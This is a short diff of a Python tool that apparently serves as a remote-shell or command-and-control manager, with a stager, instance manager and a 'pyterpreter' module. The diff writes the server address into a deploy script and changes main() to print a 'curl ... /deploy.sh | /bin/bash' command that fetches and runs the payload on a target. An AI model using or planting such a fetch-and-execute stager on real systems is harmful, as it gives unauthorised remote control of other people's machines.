@@ -15,7 +15,7 @@ from pyterpreter import Message
 from port_manager import PortManager
 
 
-REMOTE_IP = 'localhost'
+REMOTE_IP = '127.0.0.1'
 logger = my_logging.Logger('APP')
 
 
@@ -144,8 +144,19 @@ class App():
             logger.output(f'{"==> " if instance == self.selected_instance else "    "}{instance}')
 
 
+def setup_deployment():
+    with open('../resources/deploy.sh', 'r+') as fh:
+        fh.seek(0)
+        lines = fh.readlines()
+        lines[1] = f'export REMOTE_IP={REMOTE_IP}  # auto_generated\n'
+        fh.seek(0)
+        fh.writelines(lines)
+        fh.truncate()
+
+
 def main():
-    print(f'curl {REMOTE_IP}:{web_server.PORT}/pyterpreter.py | /bin/bash')
+    print(f'{"-"*30}\ncurl {REMOTE_IP}:{web_server.PORT}/deploy.sh | /bin/bash\n{"-"*30}\n')
+    setup_deployment()
     web_server.start(should_wait=False)
     stager.initialise()
     InstanceManager.start_worker()
